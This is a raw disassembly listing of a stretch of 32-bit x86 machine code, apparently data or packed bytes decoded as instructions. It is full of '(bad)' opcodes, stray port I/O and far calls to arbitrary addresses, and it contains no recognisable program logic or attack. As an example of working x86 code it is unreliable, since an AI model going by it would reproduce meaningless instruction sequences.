  42350d:	aam    0xb0
  42350f:	dec    ebx
  423510:	dec    ebx
  423511:	adc    bl,BYTE PTR [edx+0x38]
  423514:	shr    DWORD PTR [ebp-0x7c],1
  423517:	cmp    eax,0x9c17883f
  42351c:	jnp    0x423568
  42351e:	inc    eax
  42351f:	jmp    0x42358d
  423521:	fabs   
  423523:	in     eax,dx
  423524:	(bad)
  423528:	xor    dl,dh
  42352a:	imul   esp,DWORD PTR [eax-0x6bd6241b],0xaec2de37
  423534:	add    eax,0xc1082531
  423539:	push   ebx
  42353a:	pop    eax
  42353b:	jae    0x4234f4
  42353d:	fidivr DWORD PTR [ecx]
  42353f:	add    eax,0x59289c4
  423544:	inc    ecx
  423545:	xor    dl,ch
  423547:	cmp    al,0x74
  423549:	cmp    esi,DWORD PTR [ecx+0x52]
  42354c:	fmul   DWORD PTR [edi-0x4ab18b88]
  423552:	mov    eax,ds:0x5161597d
  423557:	cs mov ebp,0x75a82bc4
  42355d:	sub    eax,0x7209e32
  423562:	mov    ds:0xb3690db2,al
  423567:	add    BYTE PTR [esi-0x2be3e67],dh
  42356d:	mov    ebx,0x50595131
  423572:	mov    dl,0x22
  423574:	shl    ebx,cl
  423576:	dec    ebx
  423577:	mov    bh,0xa3
  423579:	bound  eax,QWORD PTR [edx]
  42357b:	call   0xbd92:0x982dbe9f
  423582:	push   esp
  423583:	and    DWORD PTR [ebx+0x44],0xffffffe1
  423587:	stos   DWORD PTR es:[edi],eax
  423588:	sti    
  423589:	and    al,0x43
  42358b:	inc    ebx
  42358c:	sub    bh,0xb4
  42358f:	sbb    al,0xdf
  423591:	shl    BYTE PTR [ecx+0x2b43b3ff],cl
  423597:	call   0xf36b78b0
  42359c:	iret   
  42359d:	sub    ecx,esi
  42359f:	sbb    edx,DWORD PTR [ecx-0xb]
  4235a2:	(bad)  
  4235a3:	lods   eax,DWORD PTR ds:[esi]
  4235a4:	xlat   BYTE PTR ds:[ebx]
  4235a5:	not    DWORD PTR [eax+0x2b3e1b32]
  4235ab:	adc    DWORD PTR [edx],edi
  4235ad:	popf   
  4235ae:	test   al,0xba
  4235b0:	mov    BYTE PTR [ecx],0x5c
  4235b3:	dec    esi
  4235b4:	and    al,BYTE PTR [eax]
	...
  423616:	or     BYTE PTR [edi-0x8808b84],0x88
  42361d:	dec    DWORD PTR [eax+0x2d]
  423620:	push   0xffffffda
  423622:	cmp    eax,0x70febe56
  423627:	js     0x42362a
  423629:	add    BYTE PTR [edi],al
  42362b:	add    DWORD PTR [eax],eax
  42362d:	add    bh,cl
  42362f:	aaa    
  423630:	in     al,0x41
  423632:	stos   BYTE PTR es:[edi],al
  423633:	xor    eax,0xb5db2a1a
  423638:	or     BYTE PTR [ebx+0x68],ch
  42363b:	cdq    
  42363c:	jo     0x423647
  42363e:	sar    DWORD PTR [ebp-0xf0835b7],1
  423644:	adc    al,0x5d
  423646:	dec    edx
  423647:	lahf   
  423648:	add    eax,0x5801009e
  42364d:	shl    ebp,0xed
  423650:	rcr    BYTE PTR [ecx],0xa7
  423653:	dec    esp
  423654:	pop    esi
  423655:	imul   esp,DWORD PTR [ecx-0x47],0xffffffce
  423659:	ds ins DWORD PTR es:[edi],dx
  42365b:	mov    bl,ah
  42365d:	lock xor cl,BYTE PTR [edx]
  423660:	add    cl,BYTE PTR [esi-0x2]
  423663:	(bad)  
  423664:	retf   
  423665:	or     ecx,DWORD PTR [edx-0x1996131f]
  42366b:	sub    dh,dl
  42366d:	xor    BYTE PTR [ecx],0x7e
  423670:	jmp    0xbdeb6dc2
  423675:	call   0x196b6e50
  42367a:	imul   ecx,DWORD PTR [ebx],0xffffff96
  42367d:	mov    eax,ds:0xf2774baa
  423682:	neg    DWORD PTR [edx]
  423684:	adc    dh,al
  423686:	test   ah,cl
  423688:	fist   WORD PTR [edi-0x77]
  42368b:	retf   0x1de6
  42368e:	data16 stos BYTE PTR es:[edi],al
  423690:	leave  
  423691:	or     al,0x37
  423693:	jl     0x4236e1
  423695:	mov    ecx,0x5a46764d
  42369a:	pop    esi
  42369b:	repnz inc eax
  42369d:	dec    ebx
  42369e:	mov    DWORD PTR [ebx],ebx
  4236a0:	cs pop eax
  4236a2:	cmp    dh,dl
  4236a4:	imul   bl
  4236a6:	(bad)  
  4236a7:	pop    ds
  4236a8:	jae    0x42365a
  4236aa:	sub    ecx,DWORD PTR [esi+edx*1]
  4236ad:	div    DWORD PTR [esi+0x227673c8]
  4236b3:	pop    ecx
  4236b4:	imul   edx,DWORD PTR [esi],0xd6944435
  4236ba:	div    bh
  4236bc:	jmp    FWORD PTR [ecx-0x6fd2793c]
  4236c2:	cwde   
  4236c3:	jo     0x42371b
  4236c5:	adc    al,0xa5
  4236c7:	mov    eax,ds:0x9bb52437
  4236cc:	sub    ebp,DWORD PTR [ecx-0x7fcce79c]
  4236d2:	(bad)  
  4236d3:	aas    
  4236d4:	cmp    ebp,DWORD PTR [ecx]
  4236d6:	lods   al,BYTE PTR ds:[esi]
  4236d7:	ja     0x4236b2
  4236d9:	pop    esi
  4236da:	xchg   ebx,eax
  4236db:	xchg   edi,eax
  4236dc:	sbb    al,0xed
  4236de:	ror    BYTE PTR [esi-0x6a],0x71
  4236e2:	fwait
  4236e3:	sbb    BYTE PTR [eax-0x15],ah
  4236e6:	jmp    0xea8f738f
  4236eb:	sbb    al,0x13
  4236ed:	adc    ah,BYTE PTR [ecx+0x62c6a014]
  4236f3:	pusha  
  4236f4:	cli    
  4236f5:	fs cmp al,0x25
  4236f8:	fld    QWORD PTR [esp+edx*1-0x5a16d8e6]
  4236ff:	xchg   esp,eax
  423700:	and    DWORD PTR [ebx],ebp
  423702:	into   
  423703:	in     al,0x9b
  423705:	ret    
  423706:	popf   
  423707:	xchg   BYTE PTR ds:0x9a951d3b,dh
  42370d:	fsubr  st,st(6)
  42370f:	(bad)  
  423710:	xlat   BYTE PTR ds:[ebx]
  423711:	xchg   esi,eax
  423712:	cwde   
  423713:	js     0x423699
  423715:	fwait
  423716:	push   esi
  423717:	inc    ebp
  423718:	popf   
  423719:	repnz sti 
  42371b:	adc    ebp,DWORD PTR [ebp+0x70eea096]
  423721:	stc    
  423722:	out    dx,eax
  423723:	test   DWORD PTR [ebx-0x31],0xfd50bb94
  42372a:	int3   
  42372b:	stos   BYTE PTR es:[edi],al
  42372c:	loop   0x4237ac
  42372e:	into   
  42372f:	jnp    0x42371b
  423731:	push   esp
  423732:	shl    BYTE PTR [ebp-0x64],1
	...
  423795:	add    BYTE PTR [ebx+eiz*1],dh
  423798:	jo     0x423737
  42379a:	ja     0x42377b
  42379c:	std    
  42379d:	stos   DWORD PTR es:[edi],eax
  42379e:	inc    edx
  42379f:	push   ebx
  4237a0:	cli    
  4237a1:	test   eax,0x21ae0168
  4237a6:	ja     0x423821
  4237a8:	add    DWORD PTR [eax],eax
  4237aa:	pop    es
  4237ab:	add    DWORD PTR [eax],eax
  4237ad:	add    BYTE PTR [ecx+0x723eda2f],dh
  4237b3:	jg     0x4237d3
  4237b5:	(bad)  
  4237b6:	xor    eax,0xdc4d4d66
  4237bb:	je     0x4237d4
  4237bd:	add    DWORD PTR [esi+eax*1],ebp
  4237c0:	jb     0x423745
  4237c2:	fs push ecx
  4237c4:	push   0xf555e0a1
  4237c9:	xor    ebp,DWORD PTR [esi]
  4237cb:	push   eax
  4237cc:	cmp    BYTE PTR [esi+eax*4],bh
  4237cf:	sbb    eax,0xf50a57e9
  4237d4:	mov    edi,0xbc604c3a
  4237d9:	xor    DWORD PTR [edi-0x53],eax
  4237dc:	push   edi
  4237dd:	call   DWORD PTR [esi+0x4eb2ca38]
  4237e3:	inc    edx
  4237e4:	push   ds
  4237e5:	inc    DWORD PTR [ebx+0x74f14966]
  4237eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237ec:	push   ebx
  4237ed:	mov    bh,0xa4
  4237ef:	pop    ss
  4237f0:	xlat   BYTE PTR ds:[ebx]
  4237f1:	(bad)  
  4237f2:	push   ebx
  4237f3:	mov    ds:0x38bc507a,eax
  4237f8:	mov    ds:0x1d0f989f,al
  4237fd:	ja     0x423801
  4237ff:	ret    
  423800:	shr    BYTE PTR [esi],0x42
  423803:	adc    ecx,DWORD PTR [edx-0x260b07a9]
  423809:	xchg   DWORD PTR [esp+esi*1+0x1a2eb2fa],ebx
  423810:	or     BYTE PTR [eax+0x1aff2d8b],ah
  423816:	cmp    ch,BYTE PTR [ebx+0x45]
  423819:	(bad)  
  42381a:	imul   edi,ebp,0x6a106d15
  423820:	jl     0x423870
  423822:	push   cs
  423823:	sbb    al,cl
  423825:	aad    0x30
  423827:	cmp    eax,0xa4b04a1f
  42382c:	in     al,dx
  42382d:	outs   dx,BYTE PTR ds:[esi]
  42382e:	sbb    al,0x7e
  423831:	jl     0x42380d
  423833:	ins    BYTE PTR es:[edi],dx
  423834:	jmp    0x19ea3d80
  423839:	sub    al,0x66
  42383b:	arpl   bp,ax
  42383d:	popa   
  42383e:	mov    cl,0xdd
  423840:	sub    cl,BYTE PTR [ecx]
  423842:	out    dx,eax
  423843:	adc    DWORD PTR [eax-0x38ee0279],esi
  423849:	mov    bh,0xa6
  42384b:	mov    ebx,0x97feaa09
  423850:	inc    edx
  423851:	xor    ah,BYTE PTR [ebx+0x346edea9]
  423857:	sbb    eax,0x7b1c44db
  42385c:	add    eax,0x4c03ddca
  423861:	bound  esp,QWORD PTR [eax+0x1855fb61]
  423867:	or     esi,DWORD PTR [ecx]
  423869:	stos   DWORD PTR es:[edi],eax
  42386a:	xchg   edx,eax
  42386b:	inc    edi
  42386c:	pop    ss
  42386d:	jbe    0x42381d
  42386f:	fnstenv [ebx+0x325e547]
  423875:	retf   0x7a04
  423878:	and    BYTE PTR [edi],dh
  42387a:	mov    ?,WORD PTR ds:0xf6070dd4
  423880:	dec    ecx
  423881:	(bad)  
  423882:	int    0x99
  423884:	mov    al,0x57
  423886:	push   esp
  423887:	mov    eax,0x5a2fea7
  42388c:	fs jl  0x42387b
  42388f:	adc    bh,BYTE PTR [esi+0x7739e652]
  423895:	and    al,0x71
  423897:	shl    DWORD PTR [ebx+eax*1],0x22
  42389b:	mov    ebp,0xaf1f8fce
  4238a0:	lock mov ch,0x4
  4238a3:	cmova  esp,DWORD PTR [edx+0x75]
  4238a7:	aaa    
  4238a8:	std    
  4238a9:	jg     0x423922
  4238ab:	mov    ds:0xf4a4b9a2,eax
  4238b0:	cmp    al,0x65
  4238b2:	xor    cl,BYTE PTR ds:0x0
	...
  423913:	add    BYTE PTR [eax],al
  423915:	add    BYTE PTR [edx-0x770e5c],cl
  42391b:	(bad)  
  42391d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcr    BYTE PTR [edx],1
  423921:	cmp    DWORD PTR [edx],ecx
  423923:	dec    eax
  423924:	cmp    BYTE PTR [esi+0x17a7e],bh
  42392a:	pop    es
  42392b:	add    DWORD PTR [eax],eax
  42392d:	add    BYTE PTR [eax],cl
  42392f:	add    DWORD PTR [ecx],ecx
  423931:	jmp    DWORD PTR [eax+0x4]
  423934:	mov    al,ds:0xa6d7ecfb
  423939:	bound  edx,QWORD PTR [edi+edx*2+0x53]
  42393d:	push   cs
  42393e:	xchg   edi,eax
  42393f:	pop    ds
  423940:	jno    0x4239b3
  423942:	in     eax,dx
  423943:	lds    esp,FWORD PTR [edi+0x3c]
  423946:	fcmovu st,st(3)
  423948:	mov    ebx,0x20dbf927
  42394d:	test   DWORD PTR [edx],eax
  42394f:	jp     0x4239b8
  423951:	xor    ebp,DWORD PTR [ebp+0x7]
  423954:	mov    esp,0x3f73594e
  423959:	jnp    0x423984
  42395b:	lods   eax,DWORD PTR ds:[esi]
  42395c:	out    dx,eax
  42395d:	out    0x0,eax
  42395f:	pop    ebx
  423960:	add    BYTE PTR [edi],0xfc
  423963:	aam    0x2c
  423965:	test   eax,0x5e0921f6
  42396a:	dec    edx
  42396b:	dec    edx
  42396c:	mov    ds:0xcfb6a056,al
  423971:	in     eax,0xa1
  423973:	cld    
  423974:	pop    ebx
  423975:	cmp    BYTE PTR [eax-0x73ed564d],al
  42397b:	leave  
  42397c:	lods   eax,DWORD PTR ds:[esi]
  42397d:	lea    ebx,[eax]
  42397f:	sahf   
  423980:	fadd   DWORD PTR [ebp+0x7e340e36]
  423986:	repz sbb al,0x82
  423989:	dec    ecx
  42398a:	cmp    eax,0x8b5015d3
  42398f:	sbb    al,0xaa
  423991:	icebp  
  423992:	push   edx
  423993:	mov    eax,ds:0x14bc781e
  423998:	and    eax,0x952bb300
  42399d:	mov    bl,0xfa
  42399f:	pop    ds
  4239a0:	dec    edi
  4239a1:	xadd   BYTE PTR [ebp+0x5ca3e9a3],bl
  4239a8:	fnstenv [eax]
  4239aa:	jl     0x423988
  4239ac:	sbb    BYTE PTR [edi+0x1e],bl
  4239af:	add    al,0x4b
  4239b1:	(bad)  
  4239b3:	imul   ebp,DWORD PTR [esi+eiz*1],0x22e8539
  4239ba:	inc    ebp
  4239bb:	scas   al,BYTE PTR es:[edi]
  4239bc:	jmp    0x4239b4
  4239be:	ss out dx,al
  4239c0:	mov    bh,0x43
  4239c2:	mov    eax,ds:0xc52222b6
  4239c7:	ds xchg esi,eax
  4239c9:	loop   0x423986
  4239cb:	stos   DWORD PTR es:[edi],eax
  4239cc:	cmp    dl,dh
  4239ce:	out    dx,eax
  4239cf:	add    DWORD PTR ds:0x6b613c76,edx
  4239d5:	inc    esi
  4239d6:	add    BYTE PTR [ebx+0x47],bh
  4239d9:	fs das 
  4239db:	xchg   edi,esi
  4239dd:	jl     0x4239d3
  4239df:	fisubr DWORD PTR [ecx-0x7f]
  4239e2:	dec    esp
  4239e3:	jns    0x4239a6
  4239e5:	xchg   edi,eax
  4239e6:	and    ecx,DWORD PTR ds:0x8da94195
  4239ec:	adc    BYTE PTR [ecx],0x4e
  4239ef:	and    DWORD PTR [ebx-0x45],edx
  4239f2:	mov    dl,BYTE PTR [edi]
  4239f4:	fs sbb al,0xdf
  4239f7:	shl    DWORD PTR [ebp-0x669fcf7f],cl
  4239fd:	(bad)  
  4239ff:	lods   al,BYTE PTR ds:[esi]
  423a00:	jl     0x4239dc
  423a02:	mov    cl,ch
  423a04:	xchg   ecx,eax
  423a05:	adc    DWORD PTR [ecx],ecx
  423a07:	sbb    edx,esp
  423a09:	cli    
  423a0a:	mov    bl,0x1f
  423a0c:	repz jne 0x4239a8
  423a0f:	cmp    DWORD PTR [edx-0x5989c686],ecx
  423a15:	ficom  DWORD PTR [ebx+0x76e2c9f4]
  423a1b:	push   ss
  423a1c:	ret    0x93aa
  423a1f:	mov    ?,WORD PTR [ebx-0x359451b4]
  423a25:	(bad)  
  423a26:	sbb    BYTE PTR [eax],dl
  423a28:	mov    dh,0xda
  423a2a:	ins    DWORD PTR es:[edi],dx
  423a2b:	out    dx,al
  423a2c:	imul   edi,DWORD PTR [edx],0xffffff97
  423a2f:	jp     0x4239cd
  423a31:	mov    esp,0xcf2278
	...
  423a96:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423a9c:	cli    
  423a9d:	mov    edi,0x13a51b28
  423aa2:	push   ebx
  423aa3:	xor    eax,0x7b858e4f
  423aa8:	add    DWORD PTR [eax],eax
  423aaa:	pop    es
  423aab:	add    DWORD PTR [eax],eax
  423aad:	add    BYTE PTR [esi],al
  423aaf:	add    al,0xd9
  423ab1:	pop    esp
  423ab2:	and    BYTE PTR ds:0x6fa1b979,ch
  423ab8:	mov    edx,0xc08afb03
  423abd:	xor    eax,ebx
  423abf:	in     eax,dx
  423ac0:	stos   BYTE PTR es:[edi],al
  423ac1:	ins    BYTE PTR es:[edi],dx
  423ac2:	or     DWORD PTR [ecx],ebx
  423ac4:	mov    dl,BYTE PTR [eax]
  423ac6:	retf   0x1af1
  423ac9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423acb:	inc    ecx
  423acc:	mov    WORD PTR [ebx-0x7ac2951a],fs
  423ad2:	and    BYTE PTR [esi+0x71],cl
  423ad5:	mov    dh,0x56
  423ad7:	out    dx,eax
  423ad8:	dec    ebx
  423ad9:	pushf  
  423ada:	popf   
  423adb:	loop   0x423a9e
  423add:	ins    BYTE PTR es:[edi],dx
  423ade:	sub    bl,cl
  423ae0:	push   ecx
  423ae1:	inc    ebx
  423ae2:	cmp    ebx,DWORD PTR [esi]
  423ae4:	sti    
  423ae5:	sar    BYTE PTR [esi+0x124957b7],1
  423aeb:	bound  eax,QWORD PTR [ecx]
  423aed:	and    al,0x54
  423aef:	jge    0x423adc
  423af1:	mov    eax,ds:0xef8ad07c
  423af6:	mov    bl,0x2f
  423af8:	cmp    dl,bh
  423afa:	jns    0x423b71
  423afc:	inc    ebp
  423afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423afe:	scas   al,BYTE PTR es:[edi]
  423aff:	mov    bl,BYTE PTR [edi+0x4b3dbc7b]
  423b05:	idiv   DWORD PTR [esi+0x3914376e]
  423b0b:	inc    esp
  423b0c:	and    bh,BYTE PTR [eax+0x16532a76]
  423b12:	das    
  423b13:	iret   
  423b14:	std    
  423b15:	mov    ecx,0xa13cbdba
  423b1a:	or     eax,0xa302b891
  423b1f:	rcr    eax,1
  423b21:	add    ebx,DWORD PTR [edi+edx*2]
  423b24:	iret   
  423b25:	mov    ecx,esi
  423b27:	jo     0x423b28
  423b29:	shl    DWORD PTR ds:0x433b4a7a,1
  423b2f:	xchg   ebp,eax
  423b30:	mov    cs,WORD PTR [ecx-0x1a]
  423b33:	std    
  423b34:	or     DWORD PTR fs:[ebx],0xe9ee1925
  423b3b:	pop    edi
  423b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b3d:	xor    esi,DWORD PTR [ebp+0x2f]
  423b40:	add    dh,BYTE PTR [ebx]
  423b42:	jp     0x423b8c
  423b44:	and    ch,ch
  423b46:	mov    ebx,0x4b25e28d
  423b4b:	dec    esp
  423b4c:	hlt    
  423b4d:	sti    
  423b4e:	jb     0x423b85
  423b50:	sbb    DWORD PTR [esi-0x54],0x675ed356
  423b57:	push   0x9c1364ae
  423b5c:	push   cs
  423b5d:	sub    al,BYTE PTR [ebp-0x53]
  423b60:	push   0x3513c040
  423b65:	xor    esp,eax
  423b67:	and    bh,BYTE PTR [esi+0x76225277]
  423b6d:	add    cl,BYTE PTR [edx+0x15c746c7]
  423b73:	aad    0xbf
  423b75:	or     bh,dh
  423b77:	shl    BYTE PTR [edi+0x5fa43d70],cl
  423b7d:	stc    
  423b7e:	jno    0x423bf6
  423b80:	mov    edx,0x994434b5
  423b85:	pusha  
  423b86:	data16 adc al,0xf6
  423b89:	das    
  423b8a:	jmp    0xd3fceb
  423b8f:	out    0xfb,al
  423b91:	adc    eax,esi
  423b93:	and    al,0x47
  423b95:	in     al,dx
  423b96:	and    eax,0x8d8eb89d
  423b9b:	out    0x42,eax
  423b9d:	fcomp  QWORD PTR [edx+0x20]
  423ba0:	mov    dl,cl
  423ba2:	fwait
  423ba3:	shl    BYTE PTR [ecx],1
  423ba5:	sub    bh,BYTE PTR [ebp-0x1e947a6c]
  423bab:	or     BYTE PTR [edx],cl
  423bad:	mov    edx,0xc95c2013
  423bb2:	add    DWORD PTR [ecx+ebx*8+0x0],ebx
	...
  423c16:	std    
  423c17:	(bad)  
  423c18:	test   eax,0xff57ab46
  423c1d:	inc    edi
  423c1f:	jbe    0x423c78
  423c21:	stc    
  423c22:	jno    0x423c48
  423c24:	sbb    DWORD PTR [ebp-0x74],0x7c
  423c28:	add    DWORD PTR [eax],eax
  423c2a:	pop    es
  423c2b:	add    DWORD PTR [eax],eax
  423c2d:	add    dl,cl
  423c2f:	sti    
  423c30:	mov    DWORD PTR [edx+eax*2],ebx
  423c33:	and    edi,DWORD PTR [eax-0x3a]
  423c36:	aaa    
  423c37:	and    DWORD PTR [ecx],ecx
  423c39:	sub    al,0x29
  423c3b:	inc    eax
  423c3c:	xchg   ebx,ebp
  423c3e:	or     dl,al
  423c40:	jle    0x423c0b
  423c42:	dec    ecx
  423c43:	ins    BYTE PTR es:[edi],dx
  423c44:	data16 xor ch,bl
  423c47:	scas   eax,DWORD PTR es:[edi]
  423c48:	sub    al,0x96
  423c4a:	das    
  423c4b:	test   DWORD PTR [esi+0x60ee595],eax
  423c51:	sbb    DWORD PTR [eax+0x1f897f5f],0x5881b6e6
  423c5b:	cmp    BYTE PTR [eax-0xce744b3],dl
  423c61:	mov    eax,ds:0x5f31798c
  423c66:	push   0x65
  423c68:	aad    0xf3
  423c6a:	mov    dl,0x72
  423c6c:	aaa    
  423c6d:	es jge 0x423c57
  423c70:	xchg   edi,eax
  423c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c72:	add    ecx,DWORD PTR [ebx]
  423c74:	fild   WORD PTR [ecx]
  423c76:	inc    ebp
  423c77:	cmp    BYTE PTR [edi],ah
  423c79:	xor    BYTE PTR [edx+0x5e922334],dl
  423c7f:	sbb    DWORD PTR [ebx-0x71],0xde765b88
  423c86:	or     DWORD PTR [ebp+0x675bf066],edx
  423c8c:	pop    ebx
  423c8d:	push   0x885cc0f
  423c92:	adc    DWORD PTR [ebp+0x7],esi
  423c95:	add    DWORD PTR ds:0x857aab25,ebx
  423c9b:	pop    ebp
  423c9c:	loop   0x423ce3
  423c9e:	jge    0x423c47
  423ca0:	mov    ah,0x60
  423ca2:	sbb    eax,0xd7848242
  423ca7:	xor    eax,0xfe2d910e
  423cac:	out    0x3e,eax
  423cae:	fsubr  QWORD PTR [ecx-0x45b26144]
  423cb4:	mov    eax,ds:0x32c8826a
  423cb9:	sbb    al,BYTE PTR [ebp-0x16]
  423cbc:	and    BYTE PTR [edi-0x11517f99],dh
  423cc2:	push   0x1ec194f0
  423cc7:	ror    edi,0x95
  423cca:	dec    esi
  423ccb:	adc    esp,DWORD PTR [ecx+0xda3b1e0]
  423cd1:	pop    ecx
  423cd2:	int    0xf9
  423cd4:	in     eax,0xde
  423cd6:	adc    ecx,ecx
  423cd8:	dec    esp
  423cd9:	lods   eax,DWORD PTR ds:[esi]
  423cda:	cmc    
  423cdb:	mov    ecx,0x4e1d8dca
  423ce0:	shr    ebp,1
  423ce2:	push   0x5a
  423ce4:	jg     0x423cf8
  423ce6:	sbb    dh,ch
  423ce8:	adc    al,0x78
  423cea:	jbe    0x423d5e
  423cec:	popa   
  423ced:	in     al,0x25
  423cef:	out    0xd6,al
  423cf1:	adc    al,0x9e
  423cf3:	sub    bl,BYTE PTR [ebx-0x51b842ed]
  423cf9:	and    eax,0x9bd2565f
  423cfe:	ds enter 0x4c64,0x62
  423d03:	add    eax,0x9d24cbc5
  423d08:	in     al,0x9b
  423d0a:	push   edx
  423d0b:	mov    DWORD PTR [eax-0xd],eax
  423d0e:	inc    ebp
  423d0f:	lahf   
  423d10:	test   BYTE PTR [edx],dl
  423d12:	into   
  423d13:	add    esp,eax
  423d15:	pop    esp
  423d16:	mov    dh,BYTE PTR [ebp+0x92f709c]
  423d1c:	pusha  
  423d1d:	daa    
  423d1e:	and    al,0x4e
  423d20:	push   0xfffffffa
  423d22:	jg     0x423d08
  423d24:	stc    
  423d25:	cmp    DWORD PTR [ebx+0x4af5f1e1],esi
  423d2b:	inc    esi
  423d2c:	ins    DWORD PTR es:[di],dx
  423d2e:	dec    eax
  423d2f:	lods   eax,DWORD PTR ds:[esi]
  423d30:	(bad)  
  423d31:	fadd   QWORD PTR [ebx+ecx*8+0xb9]
	...
  423d94:	add    BYTE PTR [eax],al
  423d96:	(bad)  
  423d97:	test   BYTE PTR [edi-0x118668f7],0xff
  423d9e:	iret   
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	pusha  
  423da3:	repnz shl DWORD PTR [ebx+edx*4+0x7d],0x1
  423da9:	add    BYTE PTR [edi],al
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [ebp+eiz*1+0x52],dh
  423db1:	mov    ecx,0x5fb627d5
  423db6:	and    BYTE PTR [ebx-0x5f55816c],cl
  423dbc:	or     DWORD PTR [eax],ecx
  423dbe:	mov    cl,0x5f
  423dc0:	aad    0x78
  423dc2:	or     esp,ebx
  423dc4:	in     al,dx
  423dc5:	add    edi,eax
  423dc7:	fisttp QWORD PTR [bx]
  423dca:	mov    dh,0x53
  423dcc:	repnz leave 
  423dce:	sbb    BYTE PTR [esi+0xa],bh
  423dd1:	dec    ebx
  423dd2:	jae    0x423dcc
  423dd4:	out    dx,eax
  423dd5:	out    0x3f,al
  423dd7:	jo     0x423dda
  423dd9:	iret   
  423dda:	shl    DWORD PTR [esi],cl
  423ddc:	outs   dx,BYTE PTR ds:[esi]
  423ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dde:	adc    edi,eax
  423de0:	mov    ds:0xf62ea661,al
  423de5:	push   esp
  423de6:	popa   
  423de7:	mov    esp,0xac4be8a
  423dec:	test   al,0xd4
  423dee:	push   0x29b46d8e
  423df3:	add    eax,0x709bd016
  423df8:	stos   BYTE PTR es:[edi],al
  423df9:	jl     0x423dd6
  423dfb:	and    dl,bl
  423dfd:	(bad)  
  423dfe:	sub    BYTE PTR [ebp+0x5388473],ah
  423e04:	mov    dh,0xfb
  423e06:	call   0xccea:0xfa366e76
  423e0d:	lahf   
  423e0e:	xor    edi,DWORD PTR [edi+0x16d74737]
  423e14:	mov    al,ds:0x92b50ada
  423e19:	cs popa 
  423e1b:	stos   DWORD PTR es:[edi],eax
  423e1c:	sbb    ebx,DWORD PTR [edi]
  423e1e:	iret   
  423e1f:	adc    BYTE PTR [ebx-0x219068ab],bl
  423e25:	repz out dx,eax
  423e27:	jle    0x423dcc
  423e29:	sub    BYTE PTR [edx+0x42],al
  423e2c:	jno    0x423ddc
  423e2e:	dec    esp
  423e2f:	push   edx
  423e30:	xlat   BYTE PTR ds:[ebx]
  423e31:	es sbb eax,0xae58121
  423e37:	xor    DWORD PTR [ebp-0x2a0bc98a],ebx
  423e3d:	out    dx,eax
  423e3e:	mov    bl,0xbb
  423e40:	inc    esp
  423e41:	nop
  423e42:	dec    ebp
  423e43:	mov    esp,0x869414ac
  423e48:	xchg   ebx,eax
  423e49:	cmp    al,0xe2
  423e4b:	sbb    eax,DWORD PTR [ebp-0x1fa1b5bb]
  423e51:	shl    BYTE PTR [edi+ebp*4+0x4e1a2e00],cl
  423e58:	dec    esp
  423e59:	push   ds
  423e5a:	mov    ebx,0xeaea26c5
  423e5f:	jb     0x423eb4
  423e61:	pop    es
  423e62:	shld   DWORD PTR [eax],eax,0x14
  423e66:	cmc    
  423e67:	push   esp
  423e68:	dec    esi
  423e69:	fwait
  423e6a:	xchg   BYTE PTR [esi-0x73],bl
  423e6d:	jle    0x423e3b
  423e6f:	mov    edi,esp
  423e71:	pop    edi
  423e72:	outs   dx,BYTE PTR ds:[esi]
  423e73:	push   esp
  423e74:	sub    cl,dl
  423e76:	push   ebx
  423e77:	push   0x3a
  423e79:	out    dx,eax
  423e7a:	out    dx,al
  423e7b:	mov    dl,0xe9
  423e7d:	xor    bl,BYTE PTR [ecx+ebp*8]
  423e80:	and    al,0x45
  423e82:	jo     0x423e8f
  423e84:	ja     0x423e45
  423e86:	cld    
  423e87:	pop    ecx
  423e88:	jmp    0x71162081
  423e8d:	dec    eax
  423e8e:	sar    BYTE PTR [ebp+0x50f909db],cl
  423e94:	inc    esi
  423e95:	cmp    al,0x20
  423e97:	adc    eax,0x91c4f0ea
  423e9c:	dec    edi
  423e9d:	push   ebx
  423e9e:	ja     0x423f0c
  423ea0:	rol    BYTE PTR [ebx],cl
  423ea2:	or     eax,0xc71d4400
  423ea7:	pop    edx
  423ea8:	cmc    
  423ea9:	inc    esp
  423eaa:	and    ecx,DWORD PTR [esi]
  423eac:	cmp    esp,DWORD PTR [ebx-0x3c]
  423eaf:	dec    ebp
  423eb0:	pusha  
  423eb1:	outs   dx,BYTE PTR ds:[esi]
  423eb2:	inc    esp
  423eb3:	push   esp
  423eb4:	pop    esi
	...
  423f15:	add    BYTE PTR [esi+0x74b9649a],ch
  423f1b:	(bad)  
  423f1c:	call   FWORD PTR [edi+0x5086f531]
  423f22:	aad    0x5c
  423f24:	pusha  
  423f25:	call   0x107:0x17e9a
  423f2c:	add    BYTE PTR [eax],al
  423f2e:	retf   0x3889
  423f31:	sahf   
  423f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f33:	add    DWORD PTR [edx],edx
  423f35:	sub    esp,DWORD PTR [ebp+ebx*8-0x17]
  423f39:	add    DWORD PTR [ebx],0xffffffd9
  423f3c:	and    DWORD PTR [esi+eax*8+0x5cd820cf],edi
  423f43:	push   ss
  423f44:	das    
  423f45:	repnz sbb dh,BYTE PTR [eax]
  423f48:	retf   0xb946
  423f4b:	je     0x423f14
  423f4d:	(bad)  
  423f4e:	loope  0x423f1b
  423f50:	imul   ebp,DWORD PTR [esi+0x7a],0x4c21005f
  423f57:	xor    bh,BYTE PTR [ecx-0x35759267]
  423f5d:	sub    eax,0xeeab60b5
  423f62:	cmp    al,bl
  423f64:	das    
  423f65:	mov    dh,0xbe
  423f67:	xlat   BYTE PTR ds:[bx]
  423f69:	jno    0x423f05
  423f6b:	cdq    
  423f6c:	push   ecx
  423f6d:	push   0x70d4a29
  423f72:	jg     0x423f69
  423f74:	mov    dh,0xf9
  423f76:	mov    eax,0x2c01492a
  423f7b:	push   esp
  423f7c:	in     al,dx
  423f7d:	cmp    BYTE PTR [eax],bl
  423f7f:	jle    0x423fa3
  423f81:	mov    edx,0xf0dc7b3b
  423f86:	xchg   BYTE PTR ds:0x21f9b949,ch
